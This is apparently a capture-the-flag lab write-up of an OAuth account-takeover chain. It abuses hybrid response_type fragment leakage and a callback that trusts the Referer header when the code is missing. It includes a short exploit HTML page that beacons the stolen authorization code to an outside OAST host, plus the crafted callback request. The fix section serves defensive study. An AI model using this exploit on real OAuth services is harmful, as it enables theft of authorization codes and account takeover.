# Solo Leveling: Referer Gate — OAuth Referer Trust + Hybrid Fragment Exfil

**Status: solved**

Target: Solo Leveling Referer Gate (sl4) — instance `38b794f40a24`  
Date: 2026-07-12  
Flag: `pwnbox{ec2c5f9d601ba177f6d4b0b5f720d4fb}`

Reference: [OAuth Non-Happy Path to ATO — Voorivex](https://blog.voorivex.team/oauth-non-happy-path-to-ato)

## Summary

sl4 chains two bugs:

1. **Hybrid OAuth fragment exfil** — Google IdP accepts `response_type=code+token`; non-happy callback path client-redirects the OAuth popup back to the attacker opener with `#code=...` in the fragment.
2. **Referer trust on missing-code callback** — `GET /callback?state=Sa` without `code=` exchanges the authorization code from the `Referer` header.

Attacker binds OAuth `state` as low-priv user `pwnu`, steals the reviewer bot’s authorization code via a hosted exploit page, then completes Referer-only exchange on their session to become **Statue of God**.

## Attack Surface

| Route | Role |
|-------|------|
| `/` | Mints OAuth link; `state` bound when logged in |
| `/callback` | OAuth redirect handler; Referer trust on missing `code` |
| `/profile` | Flag on privileged identity |
| `/report` | Reviewer bot URL submission |
| `/logout` | Session reset |

No `/auth`, `/init`, `/error`, or `/logger` (unlike sl1–sl3).

## Root Cause

### 1. Referer trust on missing-code callback

```http
GET /callback?state=<Sa>
Referer: https://<app>/callback?code=<R>&state=<Sa>
→ 302 Location: https://<app>/callback?code=<R>&state=<Sa>
```

Follow redirect with attacker `connect.sid` → token exchange → privileged profile.

Also confirmed: external Referer echoed in `Location` (open redirect).

### 2. Hybrid response_type + non-happy path

IdP returns hybrid tokens in URL **fragment**:

```text
/callback#code=<R>&access_token=...&state=<Sa>
```

When callback params derail from happy path (hybrid / missing expected query params), client-side redirect sends the popup back to `window.opener` origin with fragment intact. Exploit page reads `location.hash` and beacons to OAST.

Plain `response_type=code` does **not** leak — happy path consumes code server-side.

## Exploit Chain

1. Login as `pwnu`/`pwnp`; follow OAuth redirects for `connect.sid`.
2. `GET /` while logged in → bind fresh `Sa` (do not spend).
3. Host subkeeper page: `window.open()` Google OAuth with `response_type=code+token`, `prompt=none`, `state=Sa`.
4. Poll hash via OAST beacon on exploit page load.
5. `POST /report` with exploit URL (single report).
6. Steal reviewer `code=R` from OAST.
7. **Arise:** `GET /callback?state=Sa` + `Referer: .../callback?code=R&state=Sa` → follow → `/profile` as Statue of God.

## Minimal Exploit HTML

```html
<script>
function leak(d){ new Image().src="https://OAST/cap?d="+encodeURIComponent(d); }
function check(){
  var h=location.hash||"";
  if (h.indexOf("code=")>=0) leak(h+"|ref="+document.referrer);
}
check(); setInterval(check, 300);
window.open("GOOGLE_OAUTH?response_type=code+token&prompt=none&state=Sa", "", "width=1,height=1");
</script>
```

## What Failed (and why)

| Approach | Result |
|----------|--------|
| `response_type=code` popup + manual `w.location=callback?state=Sa` | Cross-origin blocked; OAST got empty `\|ref=` only |
| Iframe oauth + Referer reflect chain | Parent Referer stays exploit host |
| Aggressive `callback?state=Sa` polling | Always `Location: /`; no staged code |
| Direct OAuth `/report` with plain `code` | Happy path; no exfil |
| Portrait Referer via keeper logs | Logs lack Referer header |

## Solo Leveling series

| Lab | Mechanism |
|-----|-----------|
| sl1 HTMLi Gate | DOMPurify `referrerpolicy` in base64 `state.message` |
| sl2 State Gate | OAuth CSRF; `/auth` staged code |
| sl3 Origin Gate | Hybrid fragment + `/logger` postMessage |
| sl4 Referer Gate | Hybrid fragment exfil + Referer trust on `/callback` |

## Fix

- Require `code` in query/body; never recover OAuth params from Referer
- Never reflect Referer into `Location`
- Reject or normalize hybrid `response_type` at IdP or callback
- `Referrer-Policy: no-referrer` on callback pages
- Bind `state` to session + identity; PKCE; single-use codes

## Reusable artifacts

- `notes/oauth-referer-trust-missing-code-callback-multi-account-gate.md`
- `payloads/oauth/referer-trust-missing-code-callback-exfil-review-bot.md`
- `checklists/oauth-referer-trust-missing-code-recon.md`
- `labs/2026-07-11-solo-leveling-referer-gate-oauth-referer-leak.md`
